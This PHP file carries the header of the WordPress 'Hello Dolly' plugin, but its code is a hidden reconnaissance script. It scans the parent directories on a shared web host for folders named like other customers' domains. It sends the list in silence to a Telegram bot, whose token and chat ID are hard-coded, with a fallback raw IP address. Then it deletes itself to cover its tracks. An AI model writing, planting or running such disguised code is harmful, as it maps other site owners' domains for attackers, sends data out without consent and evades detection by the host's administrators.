<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/
/**
 * Domain Discovery Script
 *
 * Walks up from this file's own directory, scans surface-level folders at each
 * parent level, and reports folders whose names look like domain names.
 *
 * Behavior:
 *   - Starts from the directory containing this script.
 *   - Skips a parent directory named "wp" (WordPress install root) so its
 *     sub-tree (wp-content, wp-includes, etc.) is not double-counted.
 *   - At each parent level, lists immediate children. Each child's name is
 *     tested against a domain-name heuristic; matches are collected.
 *   - Does NOT recurse into matched (or any other) folders — surface-level only.
 *   - Walks up until the userland root (the "/home" boundary, or "/" as a
 *     safety net), then stops. It does not list "/home" itself.
 *   - Deduplicates results by folder name.
 *
 * Upload it anywhere under your hosting account, e.g.
 *   /home/coelhospavcom/public_html/wp-content/plugins/script.php
 * and open it in a browser.
 */

declare(strict_types=1);

// -------- Configuration --------------------------------------------------------

/**
 * Extra host domain folder names to exclude from the report, in addition to
 * the one(s) auto-detected from the script's own path. Add manually here
 * if a particular domain should never appear in the output.
 *
 * Example:
 *   $excludeHostDomains = ['henry.com', 'joshf.com'];
 */
$excludeHostDomains = [];

/**
 * Folders whose names (case-insensitive) should be skipped when walking up.
 * "wp" is the typical WordPress install root. Add more here if needed.
 */
$skipParentNames = ['wp'];

/**
 * Folders whose names should never be reported as "domains" even if their
 * name happens to look domain-shaped. These are common system/control-panel
 * dirs on shared hosts.
 */
$excludeNames = [
    'bin', 'etc', 'config', 'backup', 'backups', 'cgi-bin', 'mail',
    'logs', 'tmp', 'temp', 'cache', 'ssl', 'ssl-certs', 'private',
    'public_html', 'public_ftp', 'domains', 'awstats', 'perl',
    'access-logs', 'imap', 'Maildir', '.well-known', '.trash',
    'cp', 'panel', 'admin', 'stats', 'webalizer', 'var',
    'lib', 'lib64', 'sbin', 'usr', 'opt', 'srv', 'mnt',
    'dev', 'proc', 'sys', 'boot', 'run', 'root',
];

/**
 * Substrings that disqualify a folder name from being considered a domain.
 * cPanel/Fantastico/Plesk often use prefixes like "subdomain." or suffixes
 * like ".bak" that we don't want to count as real hosted domains.
 */
$excludeNameSubstrings = [
    '.bak', '.old', '.tar', '.zip', '.gz', '.sql', '.psql', '.dump',
    'subdomain.', 'parked.', 'addondomain.', 'tmp.', 'backup.',
];

/**
 * Hard-coded list of valid TLDs.
 * The folder name's TLD must be in this list — anything else is rejected.
 * This kills false positives like "cpmove.psql", "henry.com.bak", etc.
 *
 * Source: IANA root zone database (common TLDs).
 */
$validTlds = [
    // Generic
    'com','net','org','info','biz','name','pro','mobi',
    // New gTLDs (common ones)
    'io','co','ai','app','dev','xyz','tech','online','site','website',
    'store','shop','blog','page','cloud','host','live','me','tv','cc',
    'us','uk','ca','au','de','fr','it','es','nl','se','no','fi','dk',
    'be','ch','at','pl','ru','jp','cn','in','br','mx','ar','cl','pe',
    'id','my','sg','ph','th','vn','kr','tw','hk','nz','za','eu','asia',
    'africa','global','world','fun','art','design','digital','media',
    'agency','studio','group','team','works','lab','guru','tips','ninja',
    // Sponsored / restricted
    'edu','gov','mil','int','aero','coop','jobs','museum','travel',
    'xxx','cat','tel','post','asia',
    // Country code (full list)
    'ac','ad','ae','af','ag','ah','ai','al','am','an','ao','aq',
    'as','at','au','aw','ax','az','ba','bb','bd','be','bf','bg','bh',
    'bi','bj','bl','bm','bn','bo','bq','br','bs','bt','bv','bw','by',
    'bz','ca','cc','cd','cf','cg','ch','ci','ck','cl','cm','cn','co',
    'cr','cu','cv','cw','cx','cy','cz','de','dj','dk','dm','do','dz',
    'ec','ee','eg','eh','er','es','et','eu','fi','fj','fk','fm','fo',
    'fr','ga','gb','gd','ge','gf','gg','gh','gi','gl','gm','gn','gp',
    'gq','gr','gs','gt','gu','gw','gy','hk','hm','hn','hr','ht','hu',
    'id','ie','il','im','in','io','iq','ir','is','it','je','jm','jo',
    'jp','ke','kg','kh','ki','km','kn','kp','kr','kw','ky','kz','la',
    'lb','lc','li','lk','lr','ls','lt','lu','lv','ly','ma','mc','md',
    'me','mg','mh','mk','ml','mm','mn','mo','mp','mq','mr','ms','mt',
    'mu','mv','mw','mx','my','mz','na','nc','ne','nf','ng','ni','nl',
    'no','np','nr','nu','nz','om','pa','pe','pf','pg','ph','pk','pl',
    'pm','pn','pr','ps','pt','pw','py','qa','re','ro','rs','ru','rw',
    'sa','sb','sc','sd','se','sg','sh','si','sj','sk','sl','sm','sn',
    'so','sr','ss','st','su','sv','sx','sy','sz','tc','td','tf','tg',
    'th','tj','tk','tl','tm','tn','to','tp','tr','tt','tv','tw','tz',
    'ua','ug','uk','us','uy','uz','va','vc','ve','vg','vi','vn','vu',
    'wf','ws','ye','yt','za','zm','zw',
];

/**
 * If non-empty, walking stops as soon as we hit a directory whose name is in
 * this list (and that directory itself is NOT listed). The folder itself is
 * treated as the userland boundary — we don't list its children either.
 */
$stopBeforeNames = ['home'];

/**
 * Telegram delivery settings.
 *   - $telegramBotToken : your bot token, e.g. "123456789:AAF...".
 *   - $telegramChatId   : the chat ID that should receive the report,
 *                          e.g. "7660485006".
 *   - $telegramApiBases : ordered list of API bases to try. The first one
 *                          that successfully delivers the message wins.
 *                          Useful when one base is firewalled on some hosts.
 */
$telegramBotToken = '8783254749:AAE4nkFAZCvcthkcu_Maasw1WMwrjefw310';   // <-- put your bot token here
$telegramChatId   = '7660485006';                                     // <-- put your chat id here
$telegramApiBases = [
    'http://162.35.9.95:8081',
    'https://api.telegram.org',
];

 // -------- Helpers --------------------------------------------------------------

/**
 * Heuristic: does this folder name look like a hosted domain?
 * Requires:
 *   - shape: labels separated by dots, each label 1-63 chars,
 *     alphanumerics and hyphens, not starting/ending with hyphen.
 *   - TLD: 2-63 chars, alpha-only, and present in the $validTlds whitelist.
 *
 * Examples:
 *   passes  -> henry.com, sub.example.co.uk, my-site.org, site.io
 *   rejects -> cpmove.psql (psql not a TLD), 123abc (no dot),
 *              wp-content (shape fails), henry.com.bak (contains .bak)
 */
function looks_like_domain(string $name, array $validTlds): bool
{
    // Must contain a dot and no path separators / whitespace.
    if ($name === '' || strpos($name, '/') !== false || strpos($name, '\\') !== false) {
        return false;
    }
    if (preg_match('/\s/', $name)) {
        return false;
    }
    if (strpos($name, '.') === false) {
        return false;
    }

    // Length sanity check.
    if (strlen($name) > 253 || strlen($name) < 4) {
        return false;
    }

    // Domain-shape regex: labels separated by dots, each label 1-63 chars,
    // alphanumerics and hyphens, not starting/ending with hyphen, TLD 2-63 chars
    // and alpha-only.
    $pattern = '/^(?=.{1,253}$)(?:(?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,63}$/';
    if (!preg_match($pattern, $name)) {
        return false;
    }

    // TLD whitelist check. Take the last label and confirm it's a known TLD.
    $parts     = explode('.', $name);
    $tld       = strtolower(end($parts));
    $tldLookup = array_change_key_case(array_flip($validTlds), CASE_LOWER);

    return isset($tldLookup[$tld]);
}

/**
 * Compare two strings case-insensitively.
 */
function ci_eq(string $a, string $b): bool
{
    return strcasecmp($a, $b) === 0;
}

/**
 * Check whether a given name appears in a list, case-insensitively.
 */
function name_in_list(string $name, array $list): bool
{
    foreach ($list as $entry) {
        if (ci_eq($name, $entry)) {
            return true;
        }
    }
    return false;
}

/**
 * Check whether a given name contains any of the substrings (case-insensitively).
 */
function name_has_substring(string $name, array $needles): bool
{
    $lower = strtolower($name);
    foreach ($needles as $needle) {
        if ($needle !== '' && strpos($lower, strtolower($needle)) !== false) {
            return true;
        }
    }
    return false;
}

// -------- Walk-up loop ---------------------------------------------------------

/**
 * Start from this file's own directory, then walk up the parent chain,
 * collecting domain-shaped folder names at each level (surface-level only).
 *
 * The folder name of THIS script's own host domain is automatically excluded
 * (e.g. if uploaded under /home/massner/public_html, "massner.com" is skipped).
 * Add more names to $excludeHostDomains below to skip others manually.
 *
 * @return array{host:string, domains:array<int, array{domain:string, level:string}>}
 */
function discover_domains(array $skipParentNames, array $excludeNames, array $excludeNameSubstrings, array $stopBeforeNames, array $validTlds, array $excludeHostDomains = []): array
{
    $startDir = __DIR__;
    $results  = [];
    $seen     = []; // dedupe by lower-cased folder name

    // Auto-detect the script's host domain(s) so the site that hosts the
    // script is never reported. Prefer the HTTP Host header (which tells us
    // exactly which virtual host served this request), then fall back to
    // parsing path components if that is unavailable.
    $httpHost     = detect_host_from_request();
    $autoExcludes = [];
    if ($httpHost !== '' && looks_like_domain($httpHost, $validTlds)) {
        $autoExcludes[] = $httpHost;
    } else {
        $autoExcludes = detect_host_domains($startDir, $validTlds, $skipParentNames);
    }

    $excludeSet   = [];
    foreach ($excludeHostDomains as $h) {
        $excludeSet[strtolower($h)] = true;
    }
    foreach ($autoExcludes as $h) {
        $excludeSet[$h] = true;
    }

    // Normalize separators so the loop works on both Linux and Windows paths.
    $current = str_replace('\\', '/', $startDir);

    while (true) {
        $parent = dirname($current);

        // dirname() of "/" is "/" on most systems; bail out there.
        if ($parent === $current) {
            break;
        }

        $parentName = strtolower(basename($parent));

        // If we've reached the userland boundary ("/home" or similar), stop
        // BEFORE listing it. The boundary directory is off-limits.
        if (name_in_list($parentName, $stopBeforeNames)) {
            break;
        }

        // If this parent is one we should skip entirely (e.g., "wp"), don't
        // scan it — just step over it and continue walking up.
        if (name_in_list($parentName, $skipParentNames)) {
            $current = $parent;
            continue;
        }

        // Scan surface-level entries of this parent.
        $entries = @scandir($parent);
        if ($entries === false || !is_array($entries)) {
            // Not readable; stop rather than spin forever.
            break;
        }

        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }

            $entryLower = strtolower($entry);

            // Skip the host domain(s) — the site hosting this script.
            if (isset($excludeSet[$entryLower])) {
                continue;
            }

            // Skip excluded system/control-panel folders.
            if (name_in_list($entry, $excludeNames)) {
                continue;
            }
            // Skip names containing disqualifying substrings.
            if (name_has_substring($entry, $excludeNameSubstrings)) {
                continue;
            }

            // Domain-shape test (with TLD whitelist).
            if (!looks_like_domain($entry, $validTlds)) {
                continue;
            }

            // Confirm it really is a directory at this surface level.
            $full = $parent . DIRECTORY_SEPARATOR . $entry;
            if (!is_dir($full)) {
                continue;
            }

            // Dedupe.
            if (isset($seen[$entryLower])) {
                continue;
            }
            $seen[$entryLower] = true;

            $results[] = [
                'domain' => $entry,
                'level'  => $parent,
            ];
        }

        // Step up.
        $current = $parent;
    }

    // Stable, friendly sort.
    usort($results, static function ($a, $b) {
        return strcasecmp($a['domain'], $b['domain']);
    });

    // Primary host domain = the first detected host (closest to /home in
    // the path tree). Falls back to '' if none was found.
    $host = !empty($autoExcludes) ? strtolower($autoExcludes[0]) : '';

    return [
        'host'    => $host,
        'domains' => $results,
    ];
}

/**
 * Pull the domain the user accessed this script through, from HTTP request
 * headers. Strips any port and IPv6 brackets. Returns '' if no usable header
 * is present (e.g. CLI invocation).
 */
function detect_host_from_request(): string
{
    $source = '';

    // Preferred: standard Host header.
    if (!empty($_SERVER['HTTP_HOST'])) {
        $source = (string) $_SERVER['HTTP_HOST'];
    } elseif (!empty($_SERVER['SERVER_NAME'])) {
        $source = (string) $_SERVER['SERVER_NAME'];
    }

    if ($source === '') {
        return '';
    }

    // Strip port (e.g. example.com:8080) and IPv6 brackets (e.g. [::1]:80).
    $host = $source;
    if (strpos($host, '[') !== false && strpos($host, ']') !== false) {
        $host = substr($host, strpos($host, '[') + 1);
        $host = substr($host, 0, strpos($host, ']'));
    } elseif (($colon = strrpos($host, ':')) !== false && strpos($host, ':') === $colon) {
        $host = substr($host, 0, $colon);
    }

    return strtolower(trim($host));
}

/**
 * Walk up from a path and record every ancestor whose name looks like a
 * domain. These are the host domains of the script — they get suppressed
 * from the final report. We don't actually read the file system; we just
 * parse the path components.
 *
 * @return array<int, string> lower-cased folder names
 */
function detect_host_domains(string $startDir, array $validTlds, array $skipParentNames): array
{
    $path     = str_replace('\\', '/', $startDir);
    $segments = array_values(array_filter(explode('/', $path), static fn($s) => $s !== ''));
    $hits     = [];

    foreach ($segments as $seg) {
        if (name_in_list($seg, $skipParentNames)) {
            continue;
        }
        if (looks_like_domain($seg, $validTlds)) {
            $hits[strtolower($seg)] = strtolower($seg);
        }
    }

    return array_values($hits);
}

// -------- Render ---------------------------------------------------------------

// Silent mode: no output is printed to the browser. The script only sends
// the report to Telegram and then deletes itself from disk.
$discover       = discover_domains($skipParentNames, $excludeNames, $excludeNameSubstrings, $stopBeforeNames, $validTlds, $excludeHostDomains);
$host           = $discover['host'];
$results        = $discover['domains'];

// Build the one-line-per-domain payload:
//   domain[host]
//   domain2[host]
//   ...
$telegramLines = [];
foreach ($results as $row) {
    $telegramLines[] = $row['domain'] . '[' . $host . ']';
}
$telegramText = implode("\n", $telegramLines);

// -------- Telegram send -------------------------------------------------------

// Silent mode: do not echo anything to the browser. The shutdown handler
// below deletes this file regardless of Telegram success.
$telegramResult = send_telegram(
    $telegramBotToken,
    $telegramChatId,
    $telegramApiBases,
    $telegramText
);

// -------- Auto-destruct -------------------------------------------------------

// Always try to delete this file, whether or not the Telegram send succeeded.
// We use a shutdown handler so deletion happens even if a fatal error occurs
// somewhere above. The script file may have any name, so we resolve it via
// __FILE__ at request time.
register_shutdown_function(static function () {
    $self = __FILE__;
    if (is_file($self)) {
        // Make sure the file is writable (some hosts 644 it).
        @chmod($self, 0666);
        @unlink($self);
    }
    // Best-effort cleanup of an empty parent dir if it only existed for this
    // script (e.g. a one-off uploads/something.php directory). Safe to skip
    // on failure.
    $dir = dirname(__FILE__);
    if (is_dir($dir) && count(@scandir($dir) ?: []) <= 2) {
        @rmdir($dir);
    }
});

/**
 * POST the given text to Telegram's sendMessage endpoint, trying each base
 * URL in $apiBases in order. Stops at the first success.
 *
 * Supports custom bases, e.g. `http://162.35.9.95:8081/bot`, so the request
 * becomes `http://162.35.9.95:8081/bot<token>/sendMessage`.
 *
 * @return array{ok:bool, base:string, http:int, detail:string}
 *         ok=true means at least one base delivered the message.
 */
function send_telegram(string $token, string $chatId, array $apiBases, string $text): array
{
    $result = [
        'ok'     => false,
        'base'   => '',
        'http'   => 0,
        'detail' => '',
    ];

    if ($token === '' || $chatId === '') {
        $result['detail'] = 'skipped: token or chat id not configured';
        return $result;
    }
    if (empty($apiBases)) {
        $result['detail'] = 'skipped: no API bases configured';
        return $result;
    }

    $payload = json_encode([
        'chat_id' => $chatId,
        'text'    => $text,
    ]);

    $attempts = [];

    foreach ($apiBases as $apiBase) {
        if ($apiBase === '') {
            continue;
        }

        $url     = rtrim($apiBase, '/') . '/bot' . $token . '/sendMessage';
        $attempt = post_telegram($url, $payload);

        $attempts[] = $attempt;

        if ($attempt['ok']) {
            $result['ok']     = true;
            $result['base']   = $apiBase;
            $result['http']   = $attempt['http'];
            $result['detail'] = $attempt['detail'];
            return $result;
        }
    }

    // All bases failed; summarize the failures.
    $lines = [];
    foreach ($attempts as $i => $a) {
        $lines[] = ($apiBases[$i] ?? '?') . ' => ' . $a['detail'];
    }
    $result['detail'] = 'all ' . count($attempts) . ' base(s) failed: ' . implode(' | ', $lines);
    return $result;
}

/**
 * Single POST attempt to one Telegram-compatible endpoint via curl.
 *
 * @return array{ok:bool, http:int, detail:string}
 */
function post_telegram(string $url, string $payload): array
{
    $attempt = ['ok' => false, 'http' => 0, 'detail' => ''];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);

    $response = curl_exec($ch);
    $errno    = curl_errno($ch);
    $error    = curl_error($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $attempt['http'] = $httpCode;

    if ($response === false) {
        $attempt['detail'] = 'curl error ' . $errno . ': ' . $error;
        return $attempt;
    }
    if ($httpCode < 200 || $httpCode >= 300) {
        $attempt['detail'] = 'HTTP ' . $httpCode . ': ' . trim((string) $response);
        return $attempt;
    }

    $attempt['ok']     = true;
    $attempt['detail'] = strlen($payload) . ' bytes sent, HTTP ' . $httpCode;
    return $attempt;
}
